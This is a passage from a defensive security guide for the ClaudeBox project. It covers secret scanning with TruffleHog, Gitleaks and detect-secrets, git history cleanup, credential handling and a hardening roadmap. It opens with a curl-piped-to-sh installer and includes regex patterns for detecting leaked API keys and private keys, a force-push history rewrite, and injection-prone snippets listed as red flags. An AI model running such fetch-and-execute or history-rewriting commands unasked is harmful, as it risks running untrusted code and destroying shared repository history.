curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin

# Scan git repository (full history)
trufflehog git file://. --only-verified

# Scan specific commits
trufflehog git file://. --since-commit HEAD~10

# Scan filesystem (no git)
trufflehog filesystem /path/to/claudebox

# JSON output for automation
trufflehog git file://. --json | jq '.DetectorName, .Verified'
```

**Key Features:**
- **800+ credential types** detected (AWS, GCP, Azure, GitHub, etc.)
- **Verification**: Attempts to verify secrets are actually valid
- **Entropy analysis**: Detects high-entropy strings (random tokens)
- **Git history scanning**: Finds secrets in old commits
- **Fast**: Written in Go, parallelized scanning

**GitHub Actions Integration:**
```yaml
# .github/workflows/secrets.yml
name: TruffleHog Secret Scan
on: [push, pull_request]

jobs:
  trufflehog:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history

      - name: TruffleHog Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
          extra_args: --only-verified --fail
```

---

#### Gitleaks - Fast and Lightweight

**Installation & Usage:**
```bash
# Install
curl -sSfL https://github.com/gitleaks/gitleaks/releases/download/v8.18.1/gitleaks_8.18.1_linux_x64.tar.gz | tar xz
mv gitleaks /usr/local/bin/

# Scan repository
gitleaks detect --source . --verbose

# Scan specific files
gitleaks detect --source . --no-git

# Generate report
gitleaks detect --source . --report-format json --report-path gitleaks-report.json

# Protect mode (pre-commit)
gitleaks protect --staged --verbose
```

**Configuration:**
```toml
# .gitleaks.toml
title = "ClaudeBox Gitleaks Configuration"

[extend]
useDefault = true

[[rules]]
id = "anthropic-api-key"
description = "Anthropic API Key"
regex = '''sk-ant-[a-zA-Z0-9]{95}'''
tags = ["key", "anthropic"]

[[rules]]
id = "github-token"
description = "GitHub Personal Access Token"
regex = '''ghp_[a-zA-Z0-9]{36}'''
tags = ["key", "github"]

[allowlist]
description = "Allowlist for test files"
paths = [
  '''tests/fixtures/.*'''
]
regexes = [
  '''sk-ant-test-[a-zA-Z0-9]+'''  # Test API keys
]
```

**Pre-commit Hook:**
```bash
# .git/hooks/pre-commit
#!/bin/bash
gitleaks protect --staged --verbose --redact
if [ $? -eq 1 ]; then
    echo "❌ Gitleaks detected secrets"
    echo "Run: gitleaks protect --staged --verbose"
    exit 1
fi
```

**GitHub Actions:**
```yaml
# .github/workflows/gitleaks.yml
name: Gitleaks
on: [push, pull_request]

jobs:
  gitleaks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Run Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}  # Optional
```

---

#### detect-secrets - Baseline Approach

**Installation & Usage:**
```bash
# Install
pip install detect-secrets

# Create baseline
detect-secrets scan > .secrets.baseline

# Scan against baseline (only new secrets)
detect-secrets scan --baseline .secrets.baseline

# Audit baseline (mark false positives)
detect-secrets audit .secrets.baseline
```

**Benefits:**
- **Baseline approach**: Only alert on new secrets
- **Interactive audit**: Mark false positives
- **Python-native**: Easy integration in Python projects
- **Pre-commit support**: Native pre-commit hook

**Pre-commit Integration:**
```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
        exclude: package-lock.json
```

---

### 6.2 Secret Scanning Comparison

| Feature | TruffleHog | Gitleaks | detect-secrets |
|---------|-----------|----------|----------------|
| **Verification** | ✅ 800+ types | ❌ No | ❌ No |
| **Speed** | Fast (Go) | Very fast (Go) | Moderate (Python) |
| **Git History** | ✅ Full | ✅ Full | ✅ Full |
| **False Positives** | Low (verification) | Moderate | Moderate |
| **Baseline Mode** | ❌ No | ❌ No | ✅ Yes |
| **Custom Rules** | ✅ Yes | ✅ Yes | ✅ Yes |
| **CI/CD Integration** | ✅ Excellent | ✅ Excellent | ✅ Good |
| **Cost** | Free (OSS) | Free (OSS) | Free (OSS) |
| **Best For** | Comprehensive scanning | Fast scanning | Python projects |

**Recommendation for ClaudeBox:**
- **Primary**: TruffleHog (most comprehensive, verifies secrets)
- **Pre-commit**: Gitleaks (faster for local dev)
- **Fallback**: detect-secrets (baseline approach useful for established projects)

---

### 6.3 Preventing API Key Leakage

**Git History Cleaning (if secrets already committed):**

```bash
# WARNING: Rewrites git history - coordinate with all contributors

# 1. Use BFG Repo-Cleaner (faster than git-filter-branch)
git clone --mirror https://github.com/bdmorin/claudebox.git
java -jar bfg.jar --delete-files .env claudebox.git
cd claudebox.git
git reflog expire --expire=now --all
git gc --prune=now --aggressive
git push --force

# 2. Or use git-filter-repo (modern alternative)
git filter-repo --invert-paths --path .env --force

# 3. Invalidate ALL secrets found in history
# Even after removal, they were public and should be rotated
```

**Prevention Strategies:**

1. **.gitignore Protection:**
```gitignore
# .gitignore
# Environment files
.env
.env.*
!.env.example

# API keys
*_api_key*
*_secret*
*_token*
*.pem
*.key

# Claude configuration
.claude/settings.json
```

2. **Environment Variable Validation:**
```bash
# lib/config.sh
check_for_leaked_secrets() {
    local config_file=$1

    # Check if API keys are in version control
    if git ls-files --error-unmatch "$config_file" 2>/dev/null; then
        log "ERROR: Configuration file is tracked by git: $config_file"
        log "ERROR: This may contain secrets. Add to .gitignore"
        return 1
    fi

    # Check if API keys are in environment (vs file)
    if [[ -n "$ANTHROPIC_API_KEY" ]]; then
        if grep -q "ANTHROPIC_API_KEY.*sk-ant-" ~/.bashrc ~/.zshrc ~/.profile 2>/dev/null; then
            log "WARNING: API key found in shell config files"
            log "WARNING: Consider using a secret manager"
        fi
    fi
}
```

3. **Example Files:**
```bash
# .env.example (checked in)
ANTHROPIC_API_KEY=sk-ant-your-key-here
ANTHROPIC_API_URL=https://api.anthropic.com

# .env (not checked in)
ANTHROPIC_API_KEY=sk-ant-api03-actual-secret-key...
```

4. **Pre-commit Protection:**
```bash
# .git/hooks/pre-commit
#!/bin/bash

# Check for common secret patterns in staged files
if git diff --cached --name-only | xargs grep -E '(sk-ant-|ghp_|AKIA|-----BEGIN)' 2>/dev/null; then
    echo "❌ Potential secret found in staged files"
    echo "Secrets detected. Commit aborted."
    exit 1
fi

# Check if .env is staged
if git diff --cached --name-only | grep -E '^\.env$'; then
    echo "❌ .env file is staged"
    echo "Never commit .env files. Use .env.example instead."
    exit 1
fi
```

---

### 6.4 Secure Credential Management for ClaudeBox

**Current Usage:**
```bash
# ClaudeBox mounts .claude directory
docker run -v ~/.claude:/home/claude/.claude claudebox

# This includes settings.json with potential API keys
```

**Security Improvements:**

1. **Separate API Keys from Config:**
```bash
# Instead of API keys in settings.json
# Use environment variables only

# claudebox.sh
run_container() {
    # Pass only API key env vars, not entire .claude
    docker run \
        -e ANTHROPIC_API_KEY \
        -v ~/.claude/settings.json:/home/claude/.claude/settings.json:ro \
        claudebox
}
```

2. **Secret Manager Integration (Optional):**
```bash
# For enterprise users
# Integrate with secret managers

get_api_key() {
    if command -v aws &>/dev/null; then
        # AWS Secrets Manager
        aws secretsmanager get-secret-value \
            --secret-id claudebox/anthropic-key \
            --query SecretString --output text
    elif command -v gcloud &>/dev/null; then
        # GCP Secret Manager
        gcloud secrets versions access latest \
            --secret=claudebox-anthropic-key
    else
        # Fallback to environment
        echo "$ANTHROPIC_API_KEY"
    fi
}

ANTHROPIC_API_KEY=$(get_api_key)
```

3. **API Key Validation:**
```bash
validate_api_key() {
    local key=$1

    # Check format
    if [[ ! "$key" =~ ^sk-ant-[a-zA-Z0-9]{95}$ ]]; then
        log "ERROR: Invalid Anthropic API key format"
        return 1
    fi

    # Optional: Verify with API (rate limit this)
    if [[ "${VALIDATE_API_KEY:-false}" == "true" ]]; then
        response=$(curl -s -w "%{http_code}" \
            -H "x-api-key: $key" \
            -H "anthropic-version: 2023-06-01" \
            https://api.anthropic.com/v1/messages)

        http_code=${response: -3}
        if [[ "$http_code" == "401" ]]; then
            log "ERROR: API key authentication failed"
            return 1
        fi
    fi

    return 0
}
```

---

## 7. Implementation Roadmap for ClaudeBox

### Phase 1: Immediate Wins (Week 1)

1. **Add ShellCheck to CI/CD** (2 hours)
   - Create `.github/workflows/shellcheck.yml`
   - Fix existing ShellCheck warnings
   - Enforce in branch protection

2. **Add Trivy Container Scanning** (3 hours)
   - Create `.github/workflows/trivy.yml`
   - Scan Dockerfile template
   - Set up SARIF upload to GitHub Security

3. **Add Secret Scanning** (2 hours)
   - Choose TruffleHog or Gitleaks
   - Create `.github/workflows/secrets.yml`
   - Scan full git history once

4. **Pre-commit Hooks** (2 hours)
   - Create `.pre-commit-config.yaml`
   - Add ShellCheck, secret detection
   - Document in README

**Total: ~9 hours, massive security improvement**

---

### Phase 2: Enhanced Security (Week 2)

5. **Add Semgrep SAST** (4 hours)
   - Create `.github/workflows/semgrep.yml`
   - Add custom ClaudeBox rules
   - Create `.semgrep/` directory with rules

6. **SBOM Generation** (3 hours)
   - Integrate Syft into build process
   - Generate SBOM for each release
   - Attach to GitHub releases

7. **Input Validation Audit** (8 hours)
   - Review all user input points
   - Add validation functions to `lib/common.sh`
   - Replace `eval` usage with safer alternatives
   - Quote all variable expansions

8. **Template Security** (4 hours)
   - Audit template substitution
   - Add whitelist validation for variables
   - Document allowed template variables

**Total: ~19 hours**

---

### Phase 3: Advanced Protection (Week 3-4)

9. **Image Signing with Cosign** (6 hours)
   - Set up keyless signing workflow
   - Add verification instructions for users
   - Sign all images in GitHub Container Registry

10. **Dependency Verification** (6 hours)
    - Add checksum verification for downloaded binaries
    - Verify APT package signatures
    - Document supply chain security

11. **Security Documentation** (4 hours)
    - Create SECURITY.md
    - Document security practices
    - Add vulnerability disclosure policy

12. **Penetration Testing** (8 hours)
    - Test command injection vectors
    - Test template injection
    - Test container escape scenarios
    - Document findings and fixes

**Total: ~24 hours**

---

### Phase 4: Continuous Improvement (Ongoing)

13. **Regular Security Audits**
    - Monthly dependency updates
    - Quarterly security reviews
    - Annual penetration testing

14. **Community Security Program**
    - Bug bounty program (GitHub Security Lab)
    - Security advisory process
    - CVE tracking

15. **Monitoring and Alerting**
    - GitHub Dependabot alerts
    - Scheduled weekly security scans
    - Automated PR for security updates

---

## 8. Cost Analysis

**All recommended tools are FREE for open-source projects:**

| Tool | Cost | License |
|------|------|---------|
| ShellCheck | Free | GPL |
| Semgrep | Free (OSS) | LGPL |
| Trivy | Free | Apache 2.0 |
| Grype | Free | Apache 2.0 |
| Syft | Free | Apache 2.0 |
| TruffleHog | Free (OSS) | AGPL |
| Gitleaks | Free (OSS) | MIT |
| detect-secrets | Free | Apache 2.0 |
| Cosign | Free | Apache 2.0 |
| pre-commit | Free | MIT |
| GitHub Actions | Free (OSS) | N/A |

**Total Cost: $0/month**

**Time Investment:**
- Initial setup: ~52 hours (~1.5 weeks)
- Ongoing maintenance: ~4 hours/month

**ROI:**
- Protection against supply chain attacks: **Priceless**
- User trust and project credibility: **High**
- Reduced incident response time: **90%+**
- Compliance with security best practices: **100%**

---

## 9. Security Checklist for ClaudeBox

### Pre-Release Checklist

- [ ] **Static Analysis**
  - [ ] ShellCheck passes with no warnings
  - [ ] Semgrep security scan passes
  - [ ] Custom security rules reviewed

- [ ] **Container Security**
  - [ ] Trivy scan shows no HIGH/CRITICAL CVEs
  - [ ] Base image is from official source with digest
  - [ ] Dockerfile follows best practices
  - [ ] Image is signed with Cosign

- [ ] **Supply Chain**
  - [ ] SBOM generated and attached to release
  - [ ] All dependencies have checksums verified
  - [ ] No unverified binaries downloaded
  - [ ] APT packages from official repositories only

- [ ] **Secrets**
  - [ ] TruffleHog/Gitleaks scan passes
  - [ ] No API keys in code or config
  - [ ] .env files in .gitignore
  - [ ] Example files provided (.env.example)

- [ ] **Code Quality**
  - [ ] No use of `eval` with user input
  - [ ] All variables quoted
  - [ ] Input validation on all external data
  - [ ] Template variables whitelisted

- [ ] **Documentation**
  - [ ] SECURITY.md exists and is up to date
  - [ ] Security practices documented
  - [ ] Vulnerability disclosure policy clear
  - [ ] Users instructed on image verification

- [ ] **CI/CD**
  - [ ] All security workflows passing
  - [ ] Branch protection rules enforced
  - [ ] Pre-commit hooks documented
  - [ ] CODEOWNERS file configured

---

## 10. Incident Response Plan

### If a Security Issue is Discovered

1. **Triage (Within 1 hour)**
   - Assess severity (use CVSS score)
   - Determine impact scope
   - Identify affected versions

2. **Containment (Within 4 hours)**
   - If critical: Yank affected releases from GitHub
   - Push emergency patch to main branch
   - Notify users via GitHub Security Advisory

3. **Remediation (Within 24 hours)**
   - Develop and test fix
   - Create security patch release
   - Update all affected branches

4. **Communication (Within 24 hours)**
   - Publish GitHub Security Advisory
   - Update SECURITY.md with details
   - Post in Discussions/Issues
   - Email major users if contact info available

5. **Post-Mortem (Within 1 week)**
   - Document root cause
   - Add regression tests
   - Update security scanning rules
   - Improve processes to prevent recurrence

---

## 11. Key Takeaways

### Most Important Security Practices

1. **Always quote variables in shell scripts** - Prevents 90% of injection attacks
2. **Never use eval with user input** - No exceptions
3. **Validate all external input** - Whitelist > blacklist
4. **Scan containers with Trivy** - Catches CVEs before they're exploited
5. **Use pre-commit hooks** - Catch issues before they're committed
6. **Sign images with Cosign** - Build user trust in supply chain
7. **Generate and publish SBOMs** - Enable rapid incident response
8. **Scan for secrets in CI/CD** - Prevent credential leakage

### Red Flags to Watch For

🚩 Unquoted variables: `docker run $ARGS`
🚩 eval usage: `eval "$user_command"`
🚩 Backticks: `` `command $input` ``
🚩 Unsanitized template substitution
🚩 No input validation
🚩 Downloading binaries without verification
🚩 Base images without digest pinning
🚩 Missing security scans in CI/CD

---

## 12. Resources and References

### Tools
- **ShellCheck**: https://www.shellcheck.net/
- **Semgrep**: https://semgrep.dev/
- **Trivy**: https://trivy.dev/
- **Grype**: https://github.com/anchore/grype
- **Syft**: https://github.com/anchore/syft
- **TruffleHog**: https://github.com/trufflesecurity/trufflehog
- **Gitleaks**: https://github.com/gitleaks/gitleaks
- **Cosign**: https://docs.sigstore.dev/cosign/overview
- **pre-commit**: https://pre-commit.com/

### Standards
- **CycloneDX SBOM**: https://cyclonedx.org/
- **SPDX**: https://spdx.dev/
- **SLSA Framework**: https://slsa.dev/
- **OpenSSF Scorecard**: https://github.com/ossf/scorecard

### Learning Resources
- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
- **CIS Docker Benchmark**: https://www.cisecurity.org/benchmark/docker
- **Google Shell Style Guide**: https://google.github.io/styleguide/shellguide.html
- **Safe Shell Scripting**: https://sipb.mit.edu/doc/safe-shell/

### ClaudeBox Specific
- **Supply Chain Levels for Software Artifacts (SLSA)**: Consider achieving SLSA Level 2+
- **OpenSSF Best Practices Badge**: Apply for badge to demonstrate security commitment
- **GitHub Security Lab**: Partner for security research

---

## Conclusion

Implementing these security practices will significantly enhance ClaudeBox's resilience against:
- **Poisoned context attacks** (via input validation and template security)
- **Supply chain compromises** (via SBOM, signing, and verification)
- **Container vulnerabilities** (via Trivy scanning and base image security)
- **Credential leakage** (via secret scanning and proper .gitignore)
- **Code injection** (via ShellCheck, Semgrep, and safe coding practices)

The total implementation time is approximately 1.5-2 weeks for full deployment, with ongoing maintenance of ~4 hours/month. All tools are free and open-source, making this approach cost-effective and sustainable.

**Next Steps:**
1. Review this research with the team
2. Prioritize implementations based on risk assessment
3. Start with Phase 1 (immediate wins)
4. Document security practices in SECURITY.md
5. Communicate improvements to users

The security improvements will not only protect ClaudeBox's 1000+ users but also serve as a model for other Bash-based open-source projects in the AI development space.
